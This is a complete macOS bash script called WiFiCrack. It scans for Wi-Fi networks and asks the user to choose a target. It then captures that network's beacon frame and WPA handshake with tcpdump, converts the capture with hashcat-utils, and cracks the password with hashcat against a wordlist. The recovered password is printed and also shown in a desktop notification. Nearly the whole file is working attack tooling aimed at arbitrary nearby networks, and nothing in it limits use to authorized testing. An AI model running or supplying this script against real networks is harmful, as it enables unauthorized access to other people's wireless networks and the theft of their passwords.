#! /bin/bash

cap2hccapxlocation="/hashcat-utils/src/cap2hccapx.bin"

GREEN='\033[0;32m'
GREENT='\033[1;32m'
RED='\033[0;31m'
REDT='\033[1;31m'
BLUE='\033[0;34m'
BLUET='\033[1;34m'
LINK='\033[0;34;4m'
PURPLE='\033[0;35m'
DARKGRAY='\033[1;30m'
DUN='\033[1;30;4m'
ORANGEBROWN='\033[0;33m'
NC='\033[0m'

ostype="$( uname -s )"
COLUMNS=$(tput cols)
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null && pwd )"

if [ "$ostype" != "Darwin" ]; then
  printf "${REDT}[!] ${NC}ERROR: This script is only designed for macOS.\n"
  exit
fi

TERMINALCOLOUR="$( defaults read -g AppleInterfaceStyle 2>/dev/null )"
if [[ "$TERMINALCOLOUR" == *"Dark"* ]]; then
  DARKGRAY='\033[1;37m'
  DUN='\033[1;37;4m'
else
  DARKGRAY='\033[1;30m'
  DUN='\033[1;30;4m'
fi

printf "${NC}"

clear
cat << "EOF"

              __          ___ ______ _  _____                _
              \ \        / (_)  ____(_)/ ____|              | |
               \ \  /\  / / _| |__   _| |     _ __ __ _  ___| | __
                \ \/  \/ / | |  __| | | |    | '__/ _` |/ __| |/ /
                 \  /\  /  | | |    | | |____| | | (_| | (__|   <
                  \/  \/   |_|_|    |_|\_____|_|  \__,_|\___|_|\_\


EOF

cd ~/

if [[ "$@" == *"-h"* ]]; then
  echo "Help:"
  printf "   ${DARKGRAY}-h               ${NC}| Show this text\n"
  printf "   ${DARKGRAY}-k               ${NC}| Keep all captured packet files\n"
  printf "   ${DARKGRAY}-a               ${NC}| Turn off successfull crack alert\n"
  printf "   ${DARKGRAY}-w <wordlist>    ${NC}| Manually define path to wordlist\n"
  printf "   ${DARKGRAY}-i <interface>   ${NC}| Manually define a Wi-Fi interface\n"
  printf "   ${DARKGRAY}-d <device>      ${NC}| Manually define devices for hashcat\n"
  echo
  exit
fi

if ! [ -x "$(command -v mergecap)" ]; then
  printf "${REDT}[!] ${NC}ERROR: Cannot execute ${DARKGRAY}mergecap${NC}."
  printf "\n${GREENT}[+] ${NC}"
  read -p "Would you like to install Wireshark? (y/n): " ifoutput
  if [ "$ifoutput" == "y" ] || [ "$ifoutput" == "Y" ]; then
    open https://www.wireshark.org/download.html
    exit
  else
    printf "${BLUET}[*] ${NC}To manually install, go to: ${LINK}https://www.wireshark.org/download.html${NC}\n"
    exit
  fi
fi

if ! [ -x "$(command -v .$cap2hccapxlocation)" ]; then
  printf "${REDT}[!] ${NC}ERROR: Cannot execute ${DARKGRAY}hashcat-utils${NC}."
  printf "\n${GREENT}[+] ${NC}"
  read -p "Would you like to install hascat-utils now? (y/n): " ifoutput
  if [ "$ifoutput" == "y" ] || [ "$ifoutput" == "Y" ]; then
    cd ~/
    git clone https://github.com/hashcat/hashcat-utils.git
    cd ~/hashcat-utils/src && make
    cd ~/
    if ! [ -x "$(command -v .$cap2hccapxlocation)" ]; then
      printf "\n${REDT}[!] ${NC}ERROR: Still cannot execute ${DARKGRAY}hashcat-utils${NC}.\n\n"
      exit
    else
      printf "\n${BLUET}[*] ${NC}Finished installing ${DARKGRAY}hashcat-utils${NC}.\n\n"
    fi
  else
    printf "${BLUET}[*] ${NC}To manually install, git-clone the \"hashcat-utils\" repository and run \`make\`\n"
    exit
  fi
fi

if ! [ -x "$(command -v hashcat)" ]; then
  printf "${REDT}[!] ${NC}ERROR: Cannot execute ${DARKGRAY}hashcat${NC}."
  printf "${BLUET}[*] ${NC}To install hashcat, first install brew from: ${LINK}https://www.wireshark.org/download.html${NC}, then run \`brew install hashcat\`\n"
fi

sudo -v

cd ~/

if [[ "$@" == *"-i"* ]]; then
  wifiinterfacename="$( echo "$@" | sed -n -e 's/^.*-i //p' | cut -d\  -f1 )"
else
  wifiinterfacename="$( networksetup -listallhardwareports | awk '/Hardware Port: Wi-Fi/{getline; print $2}' )"
fi

if [[ "$@" == *"-d"* ]]; then
  hashdevice="$( echo "$@" | sed -n -e 's/^.*-d //p' | cut -d\  -f1 )"
fi

if [[ "$@" == *"-w"* ]]; then
  wordlist="$( echo "$@" | sed -n -e "s/^.*-w //p" | sed 's/ -.*//' )"
  askwordlist="0"
  if [ ! -f $wordlist ]; then
    askwordlist="1"
  fi
else
  askwordlist="1"
fi

sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -z

printf "${BLUET}[*] ${NC}Scanning for Wi-Fi networks...\n"

count=1
while read line ; do

  if [ "$count" == "1" ]; then
    clear
    printf "${DUN}%-6s${NC} %-1s ${DUN}%-4s${NC} %-22s ${DUN}%-5s${NC} %-15s ${DUN}%-6s${NC} %-2s ${DUN}%-7s${NC}" "Number" "" "Name" "" "BSSID" "" "Signal" "" "Channel"
  fi

  mad="$( echo "$line" | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' )"
  mad="$( echo ${mad//[[:blank:]]/} )"
  net="$( echo "$line" | sed "s/ *$mad.*//" )"
  sig="$( echo "$line" | sed -n -e "s/^.*$mad //p" | sed 's/ .*//' )"
  chan="$( echo "$line" | sed -n -e "s/^.*$sig  //p" | sed 's/ .*//' | sed 's/,.*//' )"

  if [ "$sig" -ge "-60" ]; then
    COLOR=$GREEN
  elif [ "$sig" -ge "-80" ]; then
    COLOR=$ORANGEBROWN
  else
    COLOR=$RED
  fi

  if [ "$chan" -ge "36" ]; then
    CHANCOLOR=$PURPLE
  else
    CHANCOLOR=$NC
  fi

  ONLYASCII="$( echo "$net" | perl -pe 's/[^[:ascii:]]//g' )"
  difference=$((${#net} - ${#ONLYASCII}))
  size=$((${difference}*2 + 27))

  printf "\n\n${DARKGRAY}%-8s${NC} %-${size}s %-21s ${COLOR}%-9s${NC} ${CHANCOLOR}%-8s${NC}" "[$count]" "$net" "$mad" "$sig" "$chan"

  scan="$scan
$net~$mad~$sig~$chan"

  count=$(($count + 1))
done < <(sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s | tail -n +2 | sort)
count=$(($count - 1))

if [ "$count" == "0" ]; then
  printf "${REDT}[!] ${NC}ERROR (airport failure): Please run WiFiCrack again...\n"
  exit
fi

scan="$( echo "$scan" | sed '/^\s*$/d' )"

printf "\n\n${GREENT}[+] ${NC}"
read -p "Select a network to crack (1-$count): " numberchoice
if [[ ! $numberchoice =~ ^[0-9]+$ ]] || [ "$numberchoice" == "0" ] || (( $numberchoice > $count )); then
  printf "${REDT}[!] ${NC}ERROR: Invalid input...\n"
  exit
fi
overall="$( echo "$scan" | awk "FNR==$numberchoice" )"
targetnet="$( echo "$overall" | sed 's/~.*//' )"
targetmac="$( echo "$overall" | sed -n -e "s/^.*$targetnet~//p" | sed 's/~.*//' )"
sig="$( echo "$overall" | sed -n -e "s/^.*$targetmac~//p" | sed 's/~.*//' )"
targetchan="$( echo "$overall" | sed -n -e "s/^.*$sig~//p" )"
printf "${BLUET}[*] ${NC}Target network set to: ${DARKGRAY}$targetnet${NC} ($targetmac)"

if [ "$askwordlist" == "1" ]; then
  printf "\n\n${GREENT}[+] ${NC}"
  read -p "Enter full path to your wordlist: " wordlist
  if [ ! -f $wordlist ]; then
    printf "${REDT}[!] ${NC}ERROR: File not found!\n"
    exit
  else
    printf "${BLUET}[*] ${NC}Wordlist set to: ${DARKGRAY}$wordlist${NC}"
  fi
fi

clear

convertsecs() {
  ((h=${1}/3600))
  ((m=(${1}%3600)/60))
  ((s=${1}%60))
  printf "%02d:%02d:%02d\n" $h $m $s
}

if [[ "$@" != *"-k"* ]]; then
  function finish {
    sudo rm -rf $DIR/beacon.cap && sudo rm -rf $DIR/handshake.cap && sudo rm -rf $DIR/capture.cap && sudo rm -rf $DIR/capture.hccapx
  }
  trap finish EXIT
fi

start=$SECONDS
DATE="$( date +"%T" )"
echo
echo "Scan started: $DATE" | fmt -c -w $COLUMNS

total=$((${#targetnet} + 16))
leftover=$(($COLUMNS - $total))
y=2
eitherside="$( echo $((leftover / y)) )"
eitherside2=$(($eitherside - 1))
printf "%-${eitherside}s %-13s ${DARKGRAY}%-${#targetnet}s${NC} %-${eitherside2}s" "" "Target network:" "$targetnet" ""

echo
echo "Waiting for a WPA handshake. This might take a while..." | fmt -c -w $COLUMNS
echo
echo "--------------------------------------------------------------------------------"
echo

cd ~/

sudo -v

sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -z
sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -c$targetchan
sudo tcpdump "type mgt subtype beacon and ether src $targetmac" -I -c 1 -i $wifiinterfacename -w $DIR/beacon.cap &>/dev/null
printf "${BLUET}[*] ${NC}Captured beacon frame, waiting for handshake...\n\n"

sudo tcpdump "ether proto 0x888e and ether host $targetmac" -I -U -vvv -i $wifiinterfacename -w $DIR/handshake.cap &>/dev/null &
PROC_ID=$!

commandnumber=0

while [ "$commandnumber" -lt "1" ] || [ "$commandoutput" != "Written" ]; do
  sudo mergecap -a -F pcap -w $DIR/capture.cap $DIR/beacon.cap $DIR/handshake.cap &>/dev/null
  command=`sudo .$cap2hccapxlocation $DIR/capture.cap $DIR/capture.hccapx "$targetnet" 2>/dev/null`

  commandoutput="$( echo "$command" | tail -1 | awk '{print $1;}' )"
  commandnumber="$( echo "$command" | tail -1 | grep -o -E '[0-9]+' | head -1 | sed -e 's/^0\+//' )"
  if [ -z "$commandnumber" ]; then
    commandnumber=0
  fi
  sleep 1
done

echo "$command"

if [[ "$@" != *"-k"* ]]; then
  sudo rm -r $DIR/beacon.cap && sudo rm -r $DIR/handshake.cap && sudo rm -r $DIR/capture.cap
fi

sudo kill $PROC_ID

DATE="$( date +"%T" )"
duration=$(( SECONDS - start ))
echo
echo "--------------------------------------------------------------------------------"
echo
echo "Scan finished, captured $commandnumber handshakes!" | fmt -c -w $COLUMNS

duration="$( echo $(convertsecs $duration) )"

echo "Time ended: $DATE ($duration)" | fmt -c -w $COLUMNS
echo

sleep 3

if [[ "$@" != *"-k"* ]]; then
  function finish {
    amiaplaceholder="yes"
  }
fi

clear
printf "\n${BLUET}[*] ${NC}Starting hashcat in...\n"
sleep 1 && printf "\n3"
echo
sleep 1 && printf "\n2"
echo
sleep 1 && printf "\n1"
sleep 1
clear

cd ~/

if [ -z "$hashdevice" ]; then
  cracker="$( hashcat -m 2500 $DIR/capture.hccapx $wordlist | tee /dev/tty | sed -e "/:$targetnet:/q" )"
else
  cracker="$( hashcat -d $hashdevice -m 2500 $DIR/capture.hccapx $wordlist | tee /dev/tty | sed -e "/:$targetnet:/q" )"
fi

clear

pass="$( echo "$cracker" | grep ":$targetnet:" | tail -1 | sed -n -e "s/^.*$targetnet://p" )"

if [ -z "$pass" ]; then
  echo
  printf "${REDT}"
  echo "WiFiCrack failed..." | fmt -c -w $COLUMNS
  printf "${NC}"
  echo
  echo "Kept handshake, crack manually with:" | fmt -c -w $COLUMNS
  printf "${DARKGRAY}"
  if [ -z "$hashdevice" ]; then
    echo "hashcat -m 2500 $DIR/capture.hccapx $wordlist" | fmt -c -w $COLUMNS
  else
    echo "hashcat -d $hashdevice -m 2500 $DIR/capture.hccapx $wordlist" | fmt -c -w $COLUMNS
  fi
  printf "${NC}"
  echo
else
  if [[ "$@" != *"-k"* ]]; then
    sudo rm -r $DIR/capture.hccapx
  fi
  echo
  printf "${GREENT}"
  echo "WiFiCrack succeeded!" | fmt -c -w $COLUMNS
  printf "${NC}"
  echo
  echo "Password for \"$targetnet\":" | fmt -c -w $COLUMNS
  printf "${DARKGRAY}"
  echo "$pass" | fmt -c -w $COLUMNS
  printf "${NC}"
  echo
  if [[ "$@" != *"-a"* ]]; then
    osascript -e 'display notification "Password for '"$targetnet"': '"$pass"'" with title "WiFiCrack"'
  fi
fi
